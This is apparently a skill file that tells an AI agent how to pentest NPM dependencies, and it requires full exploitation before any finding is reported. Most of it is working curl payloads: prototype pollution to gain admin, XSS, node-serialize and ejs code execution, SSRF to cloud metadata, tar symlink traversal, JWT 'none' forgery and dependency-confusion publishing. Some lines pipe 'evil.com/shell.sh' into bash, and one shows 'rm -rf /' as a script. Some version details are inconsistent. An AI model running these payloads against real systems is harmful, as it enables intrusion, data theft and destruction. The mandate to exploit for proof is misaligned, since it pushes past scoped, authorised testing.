---
name: npm-packages
description: NPM package vulnerability testing - dependency analysis, supply chain attacks, prototype pollution, known CVEs, malicious package detection
---

# NPM Package Vulnerability Testing

## ⚠️ CRITICAL: Exploitation Required for Reporting

**NEVER report a vulnerability based solely on tool output or version detection.**

### The Golden Rule
- **Tool says "vulnerable"** = Potential vulnerability (NOT reportable)
- **Successfully exploited with proof** = Confirmed vulnerability (REPORTABLE)

### What Constitutes Valid Proof

#### Prototype Pollution
❌ **NOT VALID**: "Lodash version is vulnerable to prototype pollution"
✅ **VALID**:
- Injected `__proto__` payload via API
- Verified pollution: `console.log({}.polluted)` returns `true`
- Escalated to admin: accessed `/admin` endpoint successfully
- Screenshot of admin panel access

#### Remote Code Execution (RCE)
❌ **NOT VALID**: "Package has known RCE vulnerability"
✅ **VALID**:
- Crafted malicious payload that executed code
- Executed `whoami` or `id` command
- Got output: `uid=33(www-data) gid=33(www-data)`
- Read `/etc/passwd` or created proof file
- Screenshot of command execution

#### Server-Side Request Forgery (SSRF)
❌ **NOT VALID**: "Axios version allows SSRF"
✅ **VALID**:
- Made server fetch internal URL: `http://169.254.169.254/latest/meta-data/`
- Retrieved AWS metadata with IAM credentials
- Accessed internal service: `http://internal-api:8080/admin`
- Screenshot of retrieved sensitive data

#### Path Traversal
❌ **NOT VALID**: "Package has path traversal CVE"
✅ **VALID**:
- Traversed to `/etc/passwd` successfully
- Retrieved file contents: `root:x:0:0:root:/root:/bin/bash`
- Read application config: `/app/config/database.yml`
- Screenshot of file contents

#### Supply Chain Attack
❌ **NOT VALID**: "Package has suspicious postinstall script"
✅ **VALID**:
- Analyzed postinstall script behavior
- Demonstrated malicious action (data exfiltration, backdoor)
- Showed network connection to attacker server
- Captured malicious payload execution

### Exploitation Workflow

1. **Detect**: Tool identifies vulnerable package version
2. **Research**: Find working exploit or craft payload
3. **Test**: Verify vulnerability exists in target environment
4. **Exploit**: Actually exploit the vulnerability
5. **Document**: Capture proof (command output, screenshots, extracted data)
6. **Report**: Only report with full exploitation proof

### Proof Requirements

Every vulnerability report MUST include:
- **Exploitation steps**: Exact payload/command used
- **Evidence**: Command output, screenshots, extracted data
- **Impact**: What you achieved (code execution, data access, etc.)
- **Reproducibility**: Clear steps to reproduce the exploit

### Common Mistakes to Avoid

❌ Reporting based on:
- `npm audit` output alone
- Version number matching CVE
- Snyk/Retire.js warnings without exploitation
- Theoretical attack vectors
- Failed exploitation attempts
- "Potential" or "possible" vulnerabilities

✅ Only report when you have:
- Successfully exploited the vulnerability
- Concrete proof of exploitation
- Demonstrated real impact
- Reproducible steps

### Example: Proper Exploitation

**Prototype Pollution → Admin Access**
```bash
# Step 1: Identify vulnerable lodash version
curl -s https://target.com/package.json | jq '.dependencies.lodash'
# Output: "4.17.15" (vulnerable to CVE-2020-8203)

# Step 2: Craft exploitation payload
curl -X POST https://target.com/api/user/update \
  -H "Content-Type: application/json" \
  -d '{
    "user": {
      "__proto__": {
        "isAdmin": true,
        "role": "admin"
      }
    }
  }'

# Step 3: Verify pollution worked
curl https://target.com/api/user/profile \
  -H "Authorization: Bearer USER_TOKEN"
# Response: {"user": {"isAdmin": true, "role": "admin", ...}}

# Step 4: Exploit for admin access
curl https://target.com/admin/dashboard \
  -H "Authorization: Bearer USER_TOKEN"
# Response: 200 OK (admin panel accessible)

# Step 5: Document proof
# - Screenshot of admin dashboard
# - Request/response showing isAdmin: true
# - List of admin actions performed
```

**This is a VALID report** because you:
- Identified the vulnerability
- Successfully exploited it
- Demonstrated real impact (admin access)
- Have reproducible proof

---

## Package Enumeration

### Discover NPM Packages
```bash
# Check for exposed package.json
curl -s https://target.com/package.json | jq '.dependencies, .devDependencies'

# Check for package-lock.json
curl -s https://target.com/package-lock.json | jq '.dependencies'

# Check for yarn.lock
curl -s https://target.com/yarn.lock | head -50

# Check for node_modules exposure
curl -s https://target.com/node_modules/ | grep -o 'href="[^"]*"' | head -20
```

### Package Fingerprinting
```bash
# Extract package versions from package.json
curl -s https://target.com/package.json | jq -r '.dependencies | to_entries[] | "\(.key): \(.value)"'

# Check for specific packages
for pkg in express lodash axios react vue angular; do
  echo "=== $pkg ==="
  curl -s https://target.com/package.json | jq ".dependencies.$pkg, .devDependencies.$pkg"
done

# Analyze JavaScript bundles for package versions
curl -s https://target.com/static/js/main.js | grep -oE "(lodash|express|axios|react|vue)@[0-9]+\.[0-9]+\.[0-9]+"
```

## Common NPM Package Vulnerabilities

### Prototype Pollution

**Lodash (< 4.17.21)**
```bash
# CVE-2020-8203 - Prototype pollution via merge
# Test payload
curl -X POST https://target.com/api/user \
  -H "Content-Type: application/json" \
  -d '{
    "user": {
      "__proto__": {
        "isAdmin": true
      }
    }
  }'

# Check if pollution worked
curl https://target.com/api/user | jq '.isAdmin'

# Alternative vectors
curl -X POST https://target.com/api/user \
  -H "Content-Type: application/json" \
  -d '{
    "user": {
      "constructor": {
        "prototype": {
          "isAdmin": true
        }
      }
    }
  }'
```

**jQuery (< 3.5.0)**
```bash
# CVE-2020-11022 - XSS via htmlPrefilter
# Test payload
curl -X POST https://target.com/api/comment \
  -H "Content-Type: application/json" \
  -d '{
    "comment": "<img src=x onerror=alert(1)>"
  }'

# Check if XSS executes in browser
# jQuery.html() or jQuery.append() with user input
```

**Hoek (< 5.0.3)**
```bash
# CVE-2018-3728 - Prototype pollution
# Test payload
curl -X POST https://target.com/api/config \
  -H "Content-Type: application/json" \
  -d '{
    "config": {
      "__proto__": {
        "polluted": true
      }
    }
  }'
```

### Cross-Site Scripting (XSS)

**DOMPurify (< 2.0.17)**
```bash
# CVE-2020-26870 - Mutation XSS
# Test payload
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

# Bypass sanitization
curl -X POST https://target.com/api/comment \
  -H "Content-Type: application/json" \
  -d '{
    "comment": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">"
  }'
```

**Marked (< 4.0.10)**
```bash
# CVE-2022-21680 - XSS via markdown
# Test payload
[Click me](javascript:alert(1))

# Bypass sanitization
curl -X POST https://target.com/api/post \
  -H "Content-Type: application/json" \
  -d '{
    "content": "[Click me](javascript:alert(1))"
  }'
```

### Remote Code Execution (RCE)

**node-serialize (< 0.0.4)**
```bash
# CVE-2017-5941 - Code execution via unserialize
# Test payload
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}

# Exploit
curl -X POST https://target.com/api/deserialize \
  -H "Content-Type: application/json" \
  -d '{
    "data": "{\"rce\":\"_$$ND_FUNC$$_function(){require(\\\"child_process\\\").exec(\\\"curl http://evil.com/shell.sh | bash\\\")}\"}"
  }'
```

**ejs (< 3.1.7)**
```bash
# CVE-2022-29078 - Server-side template injection
# Test payload
<%= process.mainModule.require('child_process').execSync('id') %>

# Exploit
curl -X POST https://target.com/api/render \
  -H "Content-Type: application/json" \
  -d '{
    "template": "<%= process.mainModule.require(\\\"child_process\\\").execSync(\\\"id\\\") %>"
  }'
```

### Server-Side Request Forgery (SSRF)

**axios (< 0.21.1)**
```bash
# CVE-2020-28168 - SSRF via proxy
# Test payload
curl -X POST https://target.com/api/fetch \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://169.254.169.254/latest/meta-data/"
  }'

# Bypass techniques
curl -X POST https://target.com/api/fetch \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://127.0.0.1:80"
  }'

curl -X POST https://target.com/api/fetch \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://localhost:80"
  }'
```

### Path Traversal

**tar (< 4.4.18)**
```bash
# CVE-2021-32804 - Path traversal via symlink
# Create malicious tar
mkdir -p malicious
echo "test" > malicious/test.txt
ln -s /etc/passwd malicious/link
tar -cvf malicious.tar -C malicious .

# Upload malicious tar
curl -X POST https://target.com/api/upload \
  -F "file=@malicious.tar"

# Check if symlink extracted
curl https://target.com/uploads/link
```

## Supply Chain Attacks

### Typosquatting
```bash
# Check for typosquatted packages
# Common typosquats:
# - expresss (express)
# - loadash (lodash)
# - axois (axios)
# - requets (requests)

# Verify package authenticity
npm view PACKAGE_NAME

# Check:
# - Download count (low = suspicious)
# - Publication date (recent = suspicious)
# - Author information
# - Repository URL
```

### Dependency Confusion
```bash
# Check for private package names in package.json
curl -s https://target.com/package.json | jq '.dependencies'

# Look for:
# - Internal package names (e.g., @company/utils)
# - Packages with no public registry entry

# Test for dependency confusion
# Create public package with same name as private package
npm publish --access public

# If target installs from public registry, you get code execution
```

### Malicious Packages
```bash
# Check for known malicious packages
# https://github.com/nicedayfor/malicious-npm-packages

# Common malicious packages:
# - event-stream (compromised in 2018)
# - ua-parser-js (compromised in 2021)
# - coa (compromised in 2021)

# Verify package integrity
npm audit
npm audit signatures

# Check package hash
npm pack PACKAGE_NAME
sha256sum PACKAGE_NAME-VERSION.tgz
```

### Lock File Poisoning
```bash
# Check for lock file manipulation
curl -s https://target.com/package-lock.json | jq '.dependencies | to_entries[] | select(.value.integrity == null)'

# Look for:
# - Missing integrity hashes
# - Suspicious resolved URLs
# - Version mismatches

# Verify lock file integrity
npm ci --dry-run
```

## Package.json Analysis

### Dangerous Scripts
```bash
# Check for dangerous npm scripts
curl -s https://target.com/package.json | jq '.scripts'

# Look for:
# - "preinstall": "curl http://evil.com/shell.sh | bash"
# - "postinstall": "node malicious.js"
# - "prepublish": "rm -rf /"

# Test for script execution
npm install --ignore-scripts  # Safe installation
npm run prepublish  # Test script
```

### Overly Permissive Dependencies
```bash
# Check for wildcard versions
curl -s https://target.com/package.json | jq '.dependencies | to_entries[] | select(.value == "*")'

# Look for:
# - "*": any version (dangerous)
# - "^1.0.0": allows minor updates (risky)
# - "~1.0.0": allows patch updates (safer)
# - "1.0.0": exact version (safest)

# Check for outdated packages
npm outdated
```

### Exposed Secrets
```bash
# Check for secrets in package.json
curl -s https://target.com/package.json | grep -iE "(api_key|secret|password|token|auth)"

# Look for:
# - Hardcoded API keys
# - Database credentials
# - Authentication tokens

# Check .npmrc for registry tokens
curl -s https://target.com/.npmrc
```

## Known CVEs in Popular Packages

### Express.js
```bash
# CVE-2022-24999 - qs prototype pollution (express < 4.18.2)
curl "https://target.com/api?__proto__[polluted]=true"

# CVE-2022-24434 - DDoS via multipart (express < 4.17.3)
curl -X POST https://target.com/api/upload \
  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary" \
  --data-binary "@large-file.txt"
```

### Lodash
```bash
# CVE-2021-23337 - Command injection (lodash < 4.17.21)
# Via _.template
curl -X POST https://target.com/api/render \
  -H "Content-Type: application/json" \
  -d '{
    "template": "<%= _.template(\\\"<%= process.mainModule.require(\\\\\\\"child_process\\\\\\\").execSync(\\\\\\\"id\\\\\\\") %>\\\")({}) %>"
  }'
```

### Axios
```bash
# CVE-2023-45857 - CSRF token leakage (axios < 1.6.0)
# Axios sends XSRF-TOKEN cookie in cross-site requests
# Check if target uses axios
curl -s https://target.com/static/js/main.js | grep -i "axios"

# Test for CSRF
curl -X POST https://target.com/api/action \
  -H "Origin: https://evil.com" \
  -H "Cookie: XSRF-TOKEN=csrf_token"
```

### jsonwebtoken
```bash
# CVE-2022-23529 - Insecure key retrieval (jsonwebtoken < 9.0.0)
# If secretOrPublicKey is a function, it may be called with untrusted input

# Test for JWT vulnerabilities
curl -H "Authorization: Bearer <token>" https://target.com/api/user

# Decode JWT
echo "<token>" | cut -d. -f2 | base64 -d

# Test for none algorithm
python3 -c "
import jwt
token = '<token>'
payload = jwt.decode(token, options={'verify_signature': False})
forged = jwt.encode(payload, '', algorithm='none')
print(forged)
"
```

## Testing Checklist

- [ ] Enumerate NPM packages (package.json, package-lock.json)
- [ ] Check package versions against known CVEs
- [ ] Test for prototype pollution (lodash, jQuery, hoek)
- [ ] Test for XSS (DOMPurify, marked, sanitize-html)
- [ ] Test for RCE (node-serialize, ejs, pug)
- [ ] Test for SSRF (axios, node-fetch, request)
- [ ] Test for path traversal (tar, adm-zip, unzipper)
- [ ] Check for typosquatted packages
- [ ] Test for dependency confusion
- [ ] Verify package authenticity (download count, author)
- [ ] Check lock file for manipulation
- [ ] Analyze package.json for dangerous scripts
- [ ] Check for overly permissive dependencies
- [ ] Search for exposed secrets in package.json
- [ ] Run npm audit for known vulnerabilities
- [ ] Verify package signatures

## Tools

```bash
# NPM audit (built-in)
npm audit
npm audit fix

# Snyk (vulnerability scanner)
npm install -g snyk
snyk test

# Retire.js (JavaScript vulnerability scanner)
npm install -g retire
retire --path /path/to/project

# Node Security Platform (nsp)
npm install -g nsp
nsp check

# Socket (supply chain security)
# https://socket.dev/

# Nuclei templates for NPM
nuclei -u https://target.com -t ~/nuclei-templates/cves/npm/
```

## Real-World Impact

**Case 1: Prototype Pollution via Lodash**
- Package: lodash 4.17.15
- Vulnerability: CVE-2020-8203 (prototype pollution)
- Impact: Attacker polluted Object.prototype, gained admin privileges

**Case 2: Supply Chain Attack via event-stream**
- Package: event-stream 3.3.6
- Attack: Maintainer transferred package to malicious actor
- Impact: Cryptocurrency wallet drainer injected, $250k+ stolen

**Case 3: RCE via node-serialize**
- Package: node-serialize 0.0.4
- Vulnerability: CVE-2017-5941 (code execution via unserialize)
- Impact: Attacker executed arbitrary code, full server compromise

**Case 4: Dependency Confusion**
- Attack: Published public packages with same names as private packages
- Impact: Internal applications installed malicious packages, code execution

**Case 5: Malicious Postinstall Script**
- Package: ua-parser-js 0.7.29 (compromised)
- Attack: Postinstall script downloaded and executed malware
- Impact: Cryptocurrency miner and credential stealer installed on 1M+ systems
